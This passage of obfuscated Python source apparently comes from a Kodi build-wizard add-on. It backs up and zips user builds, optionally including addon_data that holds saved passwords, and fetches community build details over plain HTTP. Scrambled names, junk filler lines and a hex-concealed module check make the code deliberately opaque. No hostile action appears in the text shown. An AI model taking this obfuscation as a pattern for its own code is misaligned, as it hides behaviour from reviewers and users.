 IiiI = xbmc . translatePath ( os . path . join ( I11i1 , 'Community_Builds' , 'My_Builds' , 'my_full_backup_GUI_Settings.zip' ) )
 if 75 - 75: II1 . II11iIiIIIiI + o0oo / IIIIiiII111 - o000O0o % IIIIiiII111
 if not os . path . exists ( oOoooOo0o ) :
  os . makedirs ( oOoooOo0o )
  if 89 - 89: ooo0O0O00 * IIii1I + i11iIiiIii . II1
 O0O0 = oO0ooo00o0o000Oo ( heading = "Enter a name for this backup" )
 if ( not O0O0 ) :
  return False , 0
  if 100 - 100: O00ooooo00 - i11iIiiIii . OoOo0o * o0oo
 oOIIII = urllib . quote_plus ( O0O0 )
 ooOOo = xbmc . translatePath ( os . path . join ( oOoooOo0o , oOIIII + '.zip' ) )
 i1iii1IiiiI1i1 = [ OO0o ]
 IIIiI1i1 = [ "xbmc.log" , "xbmc.old.log" , "kodi.log" , "kodi.old.log" , '.DS_Store' , '.setup_complete' , 'XBMCHelper.conf' , 'Thumbs.db' , '.gitignore' ]
 IIi11iII11i1 = [ OO0o , 'cache' , 'system' , 'Thumbnails' , "peripheral_data" , 'library' , 'keymaps' ]
 ii11111I = [ "xbmc.log" , "xbmc.old.log" , "kodi.log" , "kodi.old.log" , "Textures13.db" , '.DS_Store' , '.setup_complete' , 'XBMCHelper.conf' , 'advancedsettings.xml' , 'Thumbs.db' , '.gitignore' ]
 I111iiiii1 = "Creating full backup of existing build"
 OOOOoO = "Creating Community Build"
 OO0ooOoOO0OOo = "Archiving..."
 OooOoooo0000 = ""
 I1ii1i11i = "Please Wait"
 if 80 - 80: iiII11i1I1IIi % Oo00oo0oO % II1 * iiII11i1I1IIi % IIIIiiII111
 if ooOo == 'true' :
  o00Ooo0 ( Oo0o0000o0o0 , III , I111iiiii1 , OO0ooOoOO0OOo , OooOoooo0000 , I1ii1i11i , i1iii1IiiiI1i1 , IIIiI1i1 )
  if 41 - 41: II1 / O00ooooo00
 oO000o0Oo00 = xbmcgui . Dialog ( ) . yesno ( "Do you want to include your addon_data folder?" , 'This contains ALL addon settings including passwords but may also contain important information such as skin shortcuts. We recommend MANUALLY removing the addon_data folders that aren\'t required.' , yeslabel = 'Yes' , nolabel = 'No' )
 if 70 - 70: Iii % o0ii1I % O00ooooo00 / oOoO0o00OO0 % i11iIiiIii / O00ooooo00
 if oO000o0Oo00 == 0 :
  IIi11iII11i1 = [ OO0o , 'cache' , 'system' , 'peripheral_data' , 'library' , 'keymaps' , 'addon_data' , 'Thumbnails' ]
  if 4 - 4: Oo00oo0oO
 elif oO000o0Oo00 == 1 :
  pass
  if 93 - 93: oooOooOOo0OO % O00ooooo00
 if Oo . replace ( '%20' , ' ' ) in OooIii1I1iI and Oo != '' :
  if ( os . path . exists ( os . path . join ( i1iiIII111ii , binascii . unhexlify ( '7363726970742e6d6f64756c652e637967706669' ) ) ) and Oo . replace ( '%20' , ' ' ) in II11ii ( ) ) or not os . path . exists ( os . path . join ( i1iiIII111ii , binascii . unhexlify ( '7363726970742e6d6f64756c652e637967706669' ) ) ) :
   oO000o0Oo00 = xbmcgui . Dialog ( ) . yesno ( "Stop leechers profiting from your work?" , 'If you\'d prefer sellers not to profit from your build click yes to add a startup message on your build. Do you want add the message?' , yeslabel = 'No' , nolabel = 'Yes' )
   if oO000o0Oo00 == 0 :
    Oo0O0oooo ( Oo )
   if oO000o0Oo00 == 1 :
    try :
     OOo0OOoo00 ( )
    except :
     pass
     if 22 - 22: i11Iii / i11Iii - IIIIiiII111 % o0o . II11iIiIIIiI + Oo00oo0oO
 OooO00oo0O0 ( Oo0o0000o0o0 )
 i1iI ( )
 o00Ooo0 ( Oo0o0000o0o0 , ooOOo , OOOOoO , OO0ooOoOO0OOo , OooOoooo0000 , I1ii1i11i , IIi11iII11i1 , ii11111I )
 time . sleep ( 1 )
 if 73 - 73: II1 . iiII11i1I1IIi / OOO0O0O0ooooo - OOO0O0O0ooooo
 IiI11IIi11Iii = xbmc . translatePath ( os . path . join ( oOoooOo0o , oOIIII + '_guisettings.zip' ) )
 ii11i1I1i = zipfile . ZipFile ( IiI11IIi11Iii , mode = 'w' )
 if 49 - 49: II1 + II1 / II11iIiIIIiI . oooOooOOo0OO
 try :
  ii11i1I1i . write ( iiI1IiI , 'guisettings.xml' , zipfile . ZIP_DEFLATED )
 except :
  iIi = 0
  if 13 - 13: Ooo00oOo0oOo . ooo0O0O00 - OoOo0o . o0oo . IIii1I
 try :
  ii11i1I1i . write ( xbmc . translatePath ( os . path . join ( Oo0o0000o0o0 , 'userdata' , 'profiles.xml' ) ) , 'profiles.xml' , zipfile . ZIP_DEFLATED )
 except :
  pass
  if 66 - 66: iiII11i1I1IIi * Oo00oo0oO
 ii11i1I1i . close ( )
 if 83 - 83: II1
 if ooOo == 'true' :
  iIIi111IiII1i = zipfile . ZipFile ( IiiI , mode = 'w' )
  try :
   iIIi111IiII1i . write ( iiI1IiI , 'guisettings.xml' , zipfile . ZIP_DEFLATED )
  except :
   iIi = 0
   if 67 - 67: o000O0o % IIii1I
  try :
   iIIi111IiII1i . write ( xbmc . translatePath ( os . path . join ( Oo0o0000o0o0 , 'userdata' , 'profiles.xml' ) ) , 'profiles.xml' , zipfile . ZIP_DEFLATED )
  except :
   pass
  iIIi111IiII1i . close ( )
  if 92 - 92: ooo0O0O00 * OOO0O0O0ooooo % OoOo0o . IIii1I
 if iIi == 0 :
  i11 . ok ( "FAILED!" , 'The guisettings.xml file could not be found on your system, please reboot and try again.' , '' , '' )
  if 66 - 66: o0o + IIIIiiII111
 else :
  i11 . ok ( "SUCCESS!" , 'You Are Now Backed Up. Remember this should only be used for local backup purposes and is not recommended for sharing online. Use the far superior NaN CP backup method for online use.' )
  if 48 - 48: oOoO0o00OO0
  if ooOo == 'true' :
   i11 . ok ( "Build Locations" , 'Full Backup (only used to restore on this device): [COLOR=dodgerblue]' + III , '[/COLOR]Universal Backup: [COLOR=dodgerblue]' + ooOOo + '[/COLOR]' )
   if 96 - 96: i11Iii . II1
  else :
   i11 . ok ( "Build Location" , 'Universal Backup:[CR][COLOR=dodgerblue]' + ooOOo + '[/COLOR]' )
   if 39 - 39: II11iIiIIIiI + o0oo
   if 80 - 80: II11iIiIIIiI % o0oo / Iii
def OOOOO000oo0 ( ) :
 Ooo000O00 ( )
 OooIii1I1iI = oOoOo0 ( 'welcometext' )
 oooOo ( )
 if 2 - 2: OoOo0o * o000O0o . Oo00oo0oO * ooo0O0O00
 if os . path . exists ( oO0Oo ) :
  shutil . rmtree ( oO0Oo )
  if 30 - 30: Oo00oo0oO
 oO000o0Oo00 = i11 . yesno ( 'Create noobsandnerds Build' , 'This backup will only work if you share your build on the [COLOR=dodgerblue]NOOBSANDNERDS[/COLOR] portal with the rest of the community. It will not work with any other installer/wizard, do you wish to continue?' )
 if 98 - 98: ooo0O0O00 / IIii1I . o0o * i11iIiiIii + iiII11i1I1IIi * o0o
 if oO000o0Oo00 == 1 :
  I11 . create ( 'Checking File Structure' , '' , 'Please wait' , '' )
  if not os . path . exists ( OOO00 ) :
   os . makedirs ( OOO00 )
   if 67 - 67: ooo0O0O00
  iIi = 1
  oOoooOo0o = xbmc . translatePath ( os . path . join ( I11i1 , 'Community_Builds' , 'My_Builds' , '' ) )
  III = xbmc . translatePath ( os . path . join ( I11i1 , 'Community_Builds' , 'My_Builds' , 'my_full_backup.zip' ) )
  IiiI = xbmc . translatePath ( os . path . join ( I11i1 , 'Community_Builds' , 'My_Builds' , 'my_full_backup_GUI_Settings.zip' ) )
  if 88 - 88: iiII11i1I1IIi
  if not os . path . exists ( oOoooOo0o ) :
   os . makedirs ( oOoooOo0o )
   if 8 - 8: oOoO0o00OO0
  O0O0 = oO0ooo00o0o000Oo ( heading = "Enter a name for this backup" )
  if 82 - 82: II1
  if ( not O0O0 ) :
   return False , 0
   if 75 - 75: Ooo00oOo0oOo % o000O0o + II11iIiIIIiI % II1 / Oo00oo0oO
  oOIIII = urllib . quote_plus ( O0O0 )
  ooOOo = xbmc . translatePath ( os . path . join ( oOoooOo0o , oOIIII + '.zip' ) )
  if 4 - 4: i11iIiiIii - II11iIiIIIiI % oOoO0o00OO0 * OoOo0o % o0ii1I
  if 71 - 71: i11Iii . i11Iii - IIii1I
  i1iii1IiiiI1i1 = [ OO0o ]
  IIIiI1i1 = [ "xbmc.log" , "xbmc.old.log" , "kodi.log" , "kodi.old.log" , '.DS_Store' , '.setup_complete' , 'XBMCHelper.conf' , 'Thumbs.db' , '.gitignore' ]
  ii11111I = [ "xbmc.log" , "xbmc.old.log" , "kodi.log" , "kodi.old.log" , "Textures13.db" , '.DS_Store' , '.setup_complete' , 'XBMCHelper.conf' , 'advancedsettings.xml' , 'Thumbs.db' , '.gitignore' ]
  I111iiiii1 = "Creating full backup of existing build"
  OOOOoO = "Creating Community Build"
  OO0ooOoOO0OOo = "Archiving..."
  OooOoooo0000 = ""
  I1ii1i11i = "Please Wait"
  if 22 - 22: II1 / oOoO0o00OO0 % ooo0O0O00 * Iii
  if 32 - 32: II1 % oooOooOOo0OO % IIii1I / OOO0O0O0ooooo
  if ooOo == 'true' :
   o00Ooo0 ( Oo0o0000o0o0 , III , I111iiiii1 , OO0ooOoOO0OOo , OooOoooo0000 , I1ii1i11i , i1iii1IiiiI1i1 , IIIiI1i1 )
   if 61 - 61: Ooo00oOo0oOo . OOO0O0O0ooooo - IIIIiiII111 - oOoO0o00OO0 / i11iIiiIii - Ooo00oOo0oOo
  oO000o0Oo00 = xbmcgui . Dialog ( ) . yesno ( "Do you want to include your addon_data folder?" , 'This contains ALL addon settings including passwords but may also contain important information such as skin shortcuts. We recommend MANUALLY removing the addon_data folders that aren\'t required.' , yeslabel = 'Yes' , nolabel = 'No' )
  if 98 - 98: IIIIiiII111 - o000O0o . i11iIiiIii * iiII11i1I1IIi
  if 29 - 29: IIIIiiII111 / i11Iii % o0o
  if oO000o0Oo00 == 0 :
   IIi11iII11i1 = [ OO0o , 'cache' , 'system' , 'addons' , 'Thumbnails' , 'CP_Profiles' , 'peripheral_data' , 'library' , 'keymaps' , 'addon_data' ]
   if 10 - 10: IIii1I % II1 % oOoO0o00OO0
  elif oO000o0Oo00 == 1 :
   IIi11iII11i1 = [ OO0o , 'cache' , 'system' , 'addons' , 'Thumbnails' , 'CP_Profiles' , "peripheral_data" , 'library' , 'keymaps' ]
   if 39 - 39: Ooo00oOo0oOo * Iii . OOO0O0O0ooooo * o0o
  if Oo . replace ( '%20' , ' ' ) in OooIii1I1iI and Oo != '' :
   if ( os . path . exists ( os . path . join ( i1iiIII111ii , binascii . unhexlify ( '7363726970742e6d6f64756c652e637967706669' ) ) ) and Oo . replace ( '%20' , ' ' ) in II11ii ( ) ) or not os . path . exists ( os . path . join ( i1iiIII111ii , binascii . unhexlify ( '7363726970742e6d6f64756c652e637967706669' ) ) ) :
    oO000o0Oo00 = xbmcgui . Dialog ( ) . yesno ( "Stop leechers profiting from your work?" , 'If you\'d prefer sellers not to profit from your build click yes to add a startup message on your build. Do you want add the message?' , yeslabel = 'No' , nolabel = 'Yes' )
    if oO000o0Oo00 == 0 :
     Oo0O0oooo ( Oo )
    if oO000o0Oo00 == 1 :
     try :
      OOo0OOoo00 ( )
     except :
      pass
      if 89 - 89: IIIIiiII111 - i11Iii . o0o - OoOo0o - o000O0o
  ooo000oOO ( )
  OooO00oo0O0 ( Oo0o0000o0o0 )
  o00Ooo0 ( Oo0o0000o0o0 , ooOOo , OOOOoO , OO0ooOoOO0OOo , OooOoooo0000 , I1ii1i11i , IIi11iII11i1 , ii11111I )
  if 79 - 79: Oo00oo0oO + Oo00oo0oO + IIIIiiII111
  if 39 - 39: OOO0O0O0ooooo - II1
  try :
   os . remove ( oOOoo0Oo )
  except :
   pass
   if 63 - 63: IIii1I % o0ii1I * i11Iii
  try :
   os . remove ( oO0Oo )
  except :
   pass
   if 79 - 79: OOO0O0O0ooooo
  time . sleep ( 1 )
  if 32 - 32: Ooo00oOo0oOo . OOO0O0O0ooooo + IIIIiiII111 / Iii / Oo00oo0oO / II11iIiIIIiI
  if 15 - 15: oOoO0o00OO0
  IiI11IIi11Iii = xbmc . translatePath ( os . path . join ( oOoooOo0o , oOIIII + '_guisettings.zip' ) )
  if 4 - 4: Oo00oo0oO + IIii1I * ooo0O0O00 + iiII11i1I1IIi * o0ii1I % Ooo00oOo0oOo
  try :
   shutil . copyfile ( iiI1IiI , os . path . join ( OOO00 , 'guisettings.xml' ) )
   if IiII == 'true' :
    print "### Successfully copied guisettings to : " + os . path . join ( OOO00 , 'guisettings.xml' )
  except :
   if IiII == 'true' :
    print "### FAILED TO copy guisettings to : " + os . path . join ( OOO00 , 'guisettings.xml' )
   iIi = 0
   if 88 - 88: oooOooOOo0OO - O00ooooo00 % i11iIiiIii % Ooo00oOo0oOo * II1
  try :
   shutil . copyfile ( xbmc . translatePath ( os . path . join ( Oo0o0000o0o0 , 'userdata' , 'profiles.xml' ) ) , xbmc . translatePath ( os . path . join ( OOO00 , 'profiles.xml' ) ) )
   print "### Successfully copied profiles to : " + os . path . join ( OOO00 , 'profiles.xml' )
  except :
   pass
   if 40 - 40: iiII11i1I1IIi
  iI1Ii11 = os . path . join ( oo0o0O00 , 'script.skinshortcuts' )
  if os . path . exists ( iI1Ii11 ) :
   try :
    shutil . copytree ( os . path . join ( oo0o0O00 , 'script.skinshortcuts' ) , os . path . join ( OOO00 , 'addon_data' , 'script.skinshortcuts' ) )
    if IiII == 'true' :
     print "### Successfully copied skinshortcuts to : " + os . path . join ( OOO00 , 'addon_data' , 'script.skinshortcuts' )
   except :
    i11 . ok ( 'Failed to copy Skin Shortcuts' , 'There was an error trying to backup your script.skinshortcuts, please try again and if you continue to receive this message upload a log and send details to the noobsandnerds forum.' )
    if IiII == 'true' :
     print "### FAILED to copy skinshortcuts to: " + os . path . join ( OOO00 , 'addon_data' , 'script.skinshortcuts' )
     if 93 - 93: o000O0o / i11Iii / o0o + Ooo00oOo0oOo + i11iIiiIii
  if os . path . exists ( os . path . join ( oo0o0O00 , I11iii1Ii ) ) :
   try :
    shutil . copytree ( os . path . join ( oo0o0O00 , I11iii1Ii ) , os . path . join ( OOO00 , 'addon_data' , I11iii1Ii ) )
    if IiII == 'true' :
     print "### Successfully copied skin data to : " + os . path . join ( OOO00 , 'addon_data' , I11iii1Ii )
   except :
    i11 . ok ( 'Failed to copy skin data' , 'There was an error trying to backup your skin data, please try again and if you continue to receive this message upload a log and send details to the noobsandnerds forum.' )
    if IiII == 'true' :
     print "### FAILED to copy skin data to: " + os . path . join ( OOO00 , 'addon_data' , I11iii1Ii )
     if 16 - 16: o000O0o - oooOooOOo0OO . iiII11i1I1IIi
  I11I1i1iI ( OOO00 , IiI11IIi11Iii )
  if 94 - 94: Iii + Oo00oo0oO . i11Iii
  if 69 - 69: OOO0O0O0ooooo - OOO0O0O0ooooo
  if 41 - 41: Oo00oo0oO % o0ii1I
  if 67 - 67: OOO0O0O0ooooo % OoOo0o
  if ooOo == 'true' :
   I11I1i1iI ( OOO00 , IiiI )
   if 35 - 35: o000O0o . Iii + II1 % iiII11i1I1IIi % II11iIiIIIiI
   if 39 - 39: IIIIiiII111
  if os . path . exists ( OOO00 ) :
   shutil . rmtree ( OOO00 )
   if 60 - 60: II11iIiIIIiI
  if iIi == 0 :
   i11 . ok ( 'ERROR' , 'There was an error backing up your guisettings.xml, you cannot share a build without one so please try again. If this keeps happening please upload a log and contact the noobsandnerds forum with details.' )
   if 62 - 62: OoOo0o * o0o
  else :
   i11 . ok ( "SUCCESS!" , 'You Are Now Backed Up and can share this build with the community.' )
   if 74 - 74: Iii . IIii1I
   if ooOo == 'true' :
    i11 . ok ( "Build Locations" , 'Full Backup (only used to restore on this device): [COLOR=dodgerblue]' + III , '[/COLOR]Universal Backup (this will ONLY work for sharing on the [COLOR=dodgerblue]NOOBSANDNERDS[/COLOR] portal):[CR][COLOR=dodgerblue]' + ooOOo + '[/COLOR]' )
    if 87 - 87: i11Iii
   else :
    i11 . ok ( "Build Location" , '[COLOR=dodgerblue]NOOBSANDNERDS[/COLOR] Backup (this will ONLY work for sharing on the Community Portal):[CR][COLOR=dodgerblue]' + ooOOo + '[/COLOR]' )
    if 41 - 41: Iii . IIii1I % i11Iii + OOO0O0O0ooooo
    if 22 - 22: o0ii1I + iiII11i1I1IIi . i11Iii + oOoO0o00OO0 * ooo0O0O00 . i11iIiiIii
def O0OOOOOO0ooO ( url , video ) :
 iiiiI1IiI1I1 ( )
 OO = 'http://noobsandnerds.com/TI/Community_Builds/community_builds_test.php?id=%s' % ( url )
 Ii1iI111II1I1 = oOOOOoOO0o ( OO , 10 ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 II11IiI1 = re . compile ( 'path="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 OoOOOO00oOO = re . compile ( 'myart="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 iiIIiIi = re . compile ( 'artpack="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 iiI11Iii = re . compile ( 'videopreview="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 O000oO = re . compile ( 'videoguide1="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 ii11Ii1IiiI1 = re . compile ( 'videoguide2="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 O00o0o = re . compile ( 'videoguide3="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 OOoO0o0OOo0 = re . compile ( 'videoguide4="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 O0OoO0ooOOO = re . compile ( 'videoguide5="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 IiI1iIIIi1iIi = re . compile ( 'videolabel1="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 OOo0OOOoOOo = re . compile ( 'videolabel2="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 IIIooo0o0O = re . compile ( 'videolabel3="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 IiiiIIi11II = re . compile ( 'videolabel4="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 o0oooOo0oo = re . compile ( 'videolabel5="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 o0ooooO0o0O = re . compile ( 'name="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 i1iI1IIi1I = re . compile ( 'author="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 iI1i111I1Ii = re . compile ( 'version="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 iiI1111I11i1I = re . compile ( 'description="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 oo00i1i11I1I1 = re . compile ( 'DownloadURL="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 OOOOOoooO = re . compile ( 'UpdateURL="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 oO0Oooo0OoO = re . compile ( 'UpdateDate="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 Iiii1IIIIiiI11 = re . compile ( 'UpdateDesc="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 oOo0 = re . compile ( 'updated="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 I1iii1I = re . compile ( 'defaultskin="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 ooo = re . compile ( 'skins="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 II111 = re . compile ( 'videoaddons="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 I11iIi = re . compile ( 'audioaddons="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 Ii1IIiII1I = re . compile ( 'programaddons="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 OOOii = re . compile ( 'pictureaddons="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 Iii1I11 = re . compile ( 'sources="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 O0o0o = re . compile ( 'adult="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 IiiiIi1111I = re . compile ( 'guisettings="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 iII1i1ii = re . compile ( 'thumb="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 i1I1ii1i = re . compile ( 'fanart="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 iiiiII11iIi = re . compile ( 'openelec="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 if 51 - 51: iiII11i1I1IIi / Oo00oo0oO * IIIIiiII111 - Ooo00oOo0oOo / o000O0o . Oo00oo0oO
 Oo0oOOo = OoOOOO00oOO [ 0 ] if ( len ( OoOOOO00oOO ) > 0 ) else ''
 o0o0ooOOo0oO = iiIIiIi [ 0 ] if ( len ( iiIIiIi ) > 0 ) else ''
 oOOo0 = II11IiI1 [ 0 ] if ( len ( II11IiI1 ) > 0 ) else ''
 OOo0 = o0ooooO0o0O [ 0 ] if ( len ( o0ooooO0o0O ) > 0 ) else ''
 IiiiI1Ii = i1iI1IIi1I [ 0 ] if ( len ( i1iI1IIi1I ) > 0 ) else ''
 IIIIIo0ooOoO000oO = iI1i111I1Ii [ 0 ] if ( len ( iI1i111I1Ii ) > 0 ) else ''
 OOO0oOoO0O = iiI1111I11i1I [ 0 ] if ( len ( iiI1111I11i1I ) > 0 ) else 'No information available'
 I1iii11 = oOo0 [ 0 ] if ( len ( oOo0 ) > 0 ) else ''
 III1I1ii = I1iii1I [ 0 ] if ( len ( I1iii1I ) > 0 ) else ''
 iiIIi11ii1Ii = ooo [ 0 ] if ( len ( ooo ) > 0 ) else ''
 OO0iiiii1iiIIii = II111 [ 0 ] if ( len ( II111 ) > 0 ) else ''
 II1IIii1I11I = I11iIi [ 0 ] if ( len ( I11iIi ) > 0 ) else ''
 ii1IiIIiI11111Ii = Ii1IIiII1I [ 0 ] if ( len ( Ii1IIiII1I ) > 0 ) else ''
 O0OOo = OOOii [ 0 ] if ( len ( OOOii ) > 0 ) else ''
 O0o0O0OO0Oo00OO0oo = Iii1I11 [ 0 ] if ( len ( Iii1I11 ) > 0 ) else ''
 oOO00o0O0 = O0o0o [ 0 ] if ( len ( O0o0o ) > 0 ) else ''
 iIIii1iiiIiiI = IiiiIi1111I [ 0 ] if ( len ( IiiiIi1111I ) > 0 ) else 'None'
 oOo0Ooo0 = oo00i1i11I1I1 [ 0 ] if ( len ( oo00i1i11I1I1 ) > 0 ) else 'None'
 IiiII1iiiiI1i = OOOOOoooO [ 0 ] if ( len ( OOOOOoooO ) > 0 ) else 'None'
 OoOo = oO0Oooo0OoO [ 0 ] if ( len ( oO0Oooo0OoO ) > 0 ) else 'None'
 III1IiIi1 = Iiii1IIIIiiI11 [ 0 ] if ( len ( Iiii1IIIIiiI11 ) > 0 ) else 'None'
 oOOo000oOoO0 = iiI11Iii [ 0 ] if ( len ( iiI11Iii ) > 0 ) else 'None'
 ii1IIIIiI11 = O000oO [ 0 ] if ( len ( O000oO ) > 0 ) else 'None'
 iI1IIIii = ii11Ii1IiiI1 [ 0 ] if ( len ( ii11Ii1IiiI1 ) > 0 ) else 'None'
 I1i11ii11 = O00o0o [ 0 ] if ( len ( O00o0o ) > 0 ) else 'None'
 OO00O0oOO = OOoO0o0OOo0 [ 0 ] if ( len ( OOoO0o0OOo0 ) > 0 ) else 'None'
 Ii1iI111 = O0OoO0ooOOO [ 0 ] if ( len ( O0OoO0ooOOO ) > 0 ) else 'None'
 i1i1I = IiI1iIIIi1iIi [ 0 ] if ( len ( IiI1iIIIi1iIi ) > 0 ) else 'None'
 IiIIi1 = OOo0OOOoOOo [ 0 ] if ( len ( OOo0OOOoOOo ) > 0 ) else 'None'
 iII11I1Ii1 = IIIooo0o0O [ 0 ] if ( len ( IIIooo0o0O ) > 0 ) else 'None'
 o0o0 = IiiiIIi11II [ 0 ] if ( len ( IiiiIIi11II ) > 0 ) else 'None'
 oOo0oO = o0oooOo0oo [ 0 ] if ( len ( o0oooOo0oo ) > 0 ) else 'None'
 o00oOOoO0oO = iII1i1ii [ 0 ] if ( len ( iII1i1ii ) > 0 ) else 'None'
 oOOoO0OOoOoO = i1I1ii1i [ 0 ] if ( len ( i1I1ii1i ) > 0 ) else 'None'
 oOOo00Ooo0O = iiiiII11iIi [ 0 ] if ( len ( iiiiII11iIi ) > 0 ) else 'None'
 if 34 - 34: Ooo00oOo0oOo
 IIIIIiI11Ii = open ( I11II1i , mode = 'w+' )
 IIIIIiI11Ii . write ( 'id="' + str ( video ) + '"\nname="' + OOo0 + '"\nversion="' + IIIIIo0ooOoO000oO + '"' )
 IIIIIiI11Ii . close ( )
 if 49 - 49: o0o . II11iIiIIIiI
 oo0O = open ( IIIII , mode = 'r' )
 Iii1iI1iiIii = oo0O . read ( )
 oo0O . close ( )
 if 21 - 21: o0oo % IIii1I . o0oo
 OO000OOOo0Oo = re . compile ( 'id="(.+?)"' ) . findall ( Iii1iI1iiIii )
 Oo00O0O = OO000OOOo0Oo [ 0 ] if ( len ( OO000OOOo0Oo ) > 0 ) else 'None'
 oOoOOoo = re . compile ( 'version="(.+?)"' ) . findall ( Iii1iI1iiIii )
 O0Oo000ooO00 = oOoOOoo [ 0 ] if ( len ( oOoOOoo ) > 0 ) else 'None'
 Oo00O0o0O , O0OoOO , o0o0oO0OOO = url . partition ( '&' )
 print "### Community Build Details:"
 print "### Name: " + OOo0
 print "### URL: " + oOo0Ooo0
 OOo0oO00ooO00 ( '' , '[COLOR=yellow]IMPORTANT:[/COLOR] Install Instructions' , '' , 'instructions_2' , '' , '' , '' , '' )
 oo000o ( '[COLOR=yellow]Description:[/COLOR] This contains important info from the build author' , 'None' , 'description' , '' , oOOoO0OOoOoO , OOo0 , IiiiI1Ii , IIIIIo0ooOoO000oO , OOO0oOoO0O , I1iii11 , iiIIi11ii1Ii , OO0iiiii1iiIIii , II1IIii1I11I , ii1IiIIiI11111Ii , O0OOo , O0o0O0OO0Oo00OO0oo , oOO00o0O0 )
 if 66 - 66: IIIIiiII111 * IIii1I - i11Iii / o000O0o
 if Oo00O0O == Oo00O0o0O and O0Oo000ooO00 != IIIIIo0ooOoO000oO :
  OOo0oO00ooO00 ( '' , '[COLOR=orange]----------------- UPDATE AVAILABLE ------------------[/COLOR]' , 'None' , '' , '' , '' , '' , '' )
  o0O00o ( '[COLOR=dodgerblue]1. Update:[/COLOR] Overwrite My Library & Profiles' , oOo0Ooo0 , 'update_community' , o00oOOoO0oO , '' , 'update' , OOo0 , III1I1ii , iIIii1iiiIiiI , o0o0ooOOo0oO )
  o0O00o ( '[COLOR=dodgerblue]2. Update:[/COLOR] Keep My Library & Profiles' , oOo0Ooo0 , 'update_community' , o00oOOoO0oO , '' , 'updatelibprofile' , OOo0 , III1I1ii , iIIii1iiiIiiI , o0o0ooOOo0oO )
  o0O00o ( '[COLOR=dodgerblue]3. Update:[/COLOR] Keep My Library Only' , oOo0Ooo0 , 'update_community' , o00oOOoO0oO , '' , 'updatelibrary' , OOo0 , III1I1ii , iIIii1iiiIiiI , o0o0ooOOo0oO )
  o0O00o ( '[COLOR=dodgerblue]4. Update:[/COLOR] Keep My Profiles Only' , oOo0Ooo0 , 'update_community' , o00oOOoO0oO , '' , 'updateprofiles' , OOo0 , III1I1ii , iIIii1iiiIiiI , o0o0ooOOo0oO )
  if 62 - 62: Oo00oo0oO . OOO0O0O0ooooo . IIii1I
 if oOOo000oOoO0 != 'None' or ii1IIIIiI11 != 'None' or iI1IIIii != 'None' or I1i11ii11 != 'None' or OO00O0oOO != 'None' or Ii1iI111 != 'None' :
  OOo0oO00ooO00 ( '' , '[COLOR=orange]------------------ VIDEO GUIDES -----------------[/COLOR]' , 'None' , '' , '' , '' , '' , '' )
  if 94 - 94: i11Iii % o0o % O00ooooo00
 if oOOo000oOoO0 != 'None' :
  OOo0oO00ooO00 ( '' , '[COLOR=orange]Video:[/COLOR][COLOR=white] Preview[/COLOR]' , oOOo000oOoO0 , 'play_video' , '' , oOOoO0OOoOoO , '' , '' )
  if 90 - 90: IIIIiiII111 * o0oo
 if ii1IIIIiI11 != 'None' :
  OOo0oO00ooO00 ( '' , '[COLOR=orange]Video:[/COLOR][COLOR=white] ' + i1i1I + '[/COLOR]' , ii1IIIIiI11 , 'play_video' , '' , oOOoO0OOoOoO , '' , '' )
  if 7 - 7: ooo0O0O00 . IIIIiiII111 . ooo0O0O00 - OoOo0o
 if iI1IIIii != 'None' :
  OOo0oO00ooO00 ( '' , '[COLOR=orange]Video:[/COLOR][COLOR=white] ' + IiIIi1 + '[/COLOR]' , iI1IIIii , 'play_video' , '' , oOOoO0OOoOoO , '' , '' )
  if 33 - 33: i11Iii + II1 - o0oo / O00ooooo00 / II1
 if I1i11ii11 != 'None' :
  OOo0oO00ooO00 ( '' , '[COLOR=orange]Video:[/COLOR][COLOR=white] ' + iII11I1Ii1 + '[/COLOR]' , I1i11ii11 , 'play_video' , '' , oOOoO0OOoOoO , '' , '' )
  if 82 - 82: oOoO0o00OO0 / II11iIiIIIiI - ooo0O0O00 / iiII11i1I1IIi * o0oo
 if OO00O0oOO != 'None' :
  OOo0oO00ooO00 ( '' , '[COLOR=orange]Video:[/COLOR][COLOR=white] ' + o0o0 + '[/COLOR]' , OO00O0oOO , 'play_video' , '' , oOOoO0OOoOoO , '' , '' )
  if 55 - 55: II1
 if Ii1iI111 != 'None' :
  OOo0oO00ooO00 ( '' , '[COLOR=orange]Video:[/COLOR][COLOR=white] ' + oOo0oO + '[/COLOR]' , Ii1iI111 , 'play_video' , '' , oOOoO0OOoOoO , '' , '' )
  if 73 - 73: Iii - oOoO0o00OO0 % iiII11i1I1IIi + oOoO0o00OO0 - OOO0O0O0ooooo . o0oo
 if Oo00O0O != Oo00O0o0O :
  OOo0oO00ooO00 ( '' , '[COLOR=orange]------------------ INSTALL OPTIONS ------------------[/COLOR]' , 'None' , '' , '' , '' , '' , '' )
